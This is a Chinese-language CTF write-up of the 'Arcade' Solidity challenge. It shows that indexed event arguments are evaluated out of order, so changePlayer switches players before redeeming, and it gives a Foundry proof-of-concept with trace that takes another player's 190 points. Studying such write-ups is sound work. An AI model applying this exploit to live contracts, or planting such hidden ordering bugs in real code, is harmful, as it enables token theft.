## Arcade

这道 CTF 挑战的目标是获取超过 200 个 Arcade 代币。要获取代币，参与者需要调用 `earn()` 函数积累积分，然后调用 `redeem()` 函数将这些积分转换为代币。

### 一、合约分析

#### 核心功能：
1. 积分获取：通过 `earn()` 函数，玩家可以获取 10 分，但这个函数有 10 分钟的调用频率限制。
    ```solidity
        function earn() external onlyPlayer {
            require(block.timestamp >= lastEarnTimestamp + 10 minutes, "Too frequent");
            address player = msg.sender;
            scoreboard[player] += 10;
            lastEarnTimestamp = block.timestamp;
            emit PlayerEarned(player, getCurrentPlayerPoints());
        }
    ```

2. 积分兑换代币：玩家通过调用 `redeem()` 函数，将积分按 1:1 比例兑换为 Arcade 代币。
   ```solidity
        function redeem() external onlyPlayer {
            _redeem(msg.sender);
        }
   ```

3. 玩家切换：当前玩家可以通过 `changePlayer()` 函数将玩家身份切换为其他玩家。
   ```solidity
        event PlayerChanged(address indexed oldPlayer, address indexed newPlayer);
        function changePlayer(address newPlayer) external onlyPlayer {
            address oldPlayer = currentPlayer;
            emit PlayerChanged(_redeem(oldPlayer), _setNewPlayer(newPlayer));
        }
   ```

4. 预设玩家积分：
   在 `setup()` 函数中，存在四个预设的玩家，他们被赋予了特定的初始积分：
   ``` solidity
        address public constant player1 = 0x1111Ad317502Ba53c84BD2D859237D33846Ca2e7;
        address public constant player2 = 0x2222140D9A0809B35D88636E3dDeC37B6bDd7CB2;
        address public constant player3 = 0x33339741B46D6EE8adCc0d796dE2aB6Ea3E8dc2A;
        address public constant player4 = 0x4444bd21FA6Ec8846308e926B86D06b74f63f4aD;

        arcade.setPoints(player1, 80);
        arcade.setPoints(player2, 120);
        arcade.setPoints(player3, 180);
        arcade.setPoints(player4, 190);
   ```

### 二、题解

在分析代码时，我们发现通过调用 `earn()` 获取足够的积分并不现实。由于每 10 分钟只能赚取 10 分，达到 200 个代币需要 10 次调用，这需要超过 1 小时的时间。而这种方式显然不符合快速解题的要求。

漏洞在 `changePlayer()` 函数里，在切换玩家的过程中，你以为代码会先调用 `_redeem()` 函数兑换当前玩家的积分，然后再调用 `_setNewPlayer()` 切换到新的玩家。然而，事件中索引参数是按照从右到左的顺序求值，而非索引参数则是从左到右求值。这意味着 `_setNewPlayer()` 先执行，而 `_redeem()` 后执行。因此，当我们调用 `changePlayer(player4)` 时，`currentPlayer` 会先被切换为 `player4`，而 `player4` 的积分（190 分）将被兑换给当前玩家。

通过对预设玩家积分的分析，`player4` 拥有 190 分，而通过一次 `earn()` 调用可以获取 10 分，因此可以利用 `changePlayer()` 函数将 `player4` 的 190 积分兑换给自己，最终达到 200 分的要求。

POC:  
```solidity
    function testExploit() public {
        vm.warp(10 minutes);
        vm.startPrank(you);
        arcade.earn(); // Earn 10 points
        arcade.redeem(); // Mint 10 PRIZE
        arcade.changePlayer(player4); // Mint 190 PRIZE
        arcadeBase.solve();
        assertTrue(arcadeBase.isSolved());
        vm.stopPrank();
    }
```

```
[PASS] testExploit() (gas: 133678)
Traces:
  [153578] ArcadeTest::testExploit()
    ├─ [0] VM::warp(600)
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(You: [0x5F82A812Fa0bF05D4336C8317833f5DCEFBfcCAE])
    │   └─ ← [Return] 
    ├─ [48615] Arcade::earn()
    │   ├─ emit PlayerEarned(player: You: [0x5F82A812Fa0bF05D4336C8317833f5DCEFBfcCAE], currentPoints: 10)
    │   └─ ← [Stop] 
    ├─ [47144] Arcade::redeem()
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: You: [0x5F82A812Fa0bF05D4336C8317833f5DCEFBfcCAE], value: 10)
    │   └─ ← [Stop] 
    ├─ [10245] Arcade::changePlayer(0x4444bd21FA6Ec8846308e926B86D06b74f63f4aD)
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: You: [0x5F82A812Fa0bF05D4336C8317833f5DCEFBfcCAE], value: 190)
    │   ├─ emit PlayerChanged(oldPlayer: You: [0x5F82A812Fa0bF05D4336C8317833f5DCEFBfcCAE], newPlayer: 0x4444bd21FA6Ec8846308e926B86D06b74f63f4aD)
    │   └─ ← [Stop] 
    ├─ [27568] ArcadeBase::solve()
    │   ├─ [673] Arcade::balanceOf(You: [0x5F82A812Fa0bF05D4336C8317833f5DCEFBfcCAE]) [staticcall]
    │   │   └─ ← [Return] 200
    │   └─ ← [Stop] 
    ├─ [375] ArcadeBase::isSolved() [staticcall]
    │   └─ ← [Return] true
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 
```

相关链接：

[Underhanded Solidity Contest 2022 winning entry](https://github.com/ethereum/solidity-underhanded-contest/blob/master/2022/submissions_2022/submission9_TynanRichards/SPOILERS.md)

